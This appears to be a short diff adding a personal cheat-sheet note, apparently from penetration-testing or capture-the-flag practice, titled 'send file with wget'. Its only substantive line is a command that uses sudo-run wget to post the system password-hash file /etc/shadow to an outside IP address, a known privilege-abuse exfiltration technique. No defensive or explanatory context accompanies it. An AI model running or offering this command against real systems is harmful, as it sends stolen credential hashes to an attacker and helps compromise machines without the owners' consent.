@@ -1,0 +1,5 @@
+
+send file with wget ========>>>>>
+wget ==>
+
+sudo /usr/bin/wget --post-file=/etc/shadow 10.10.14.6
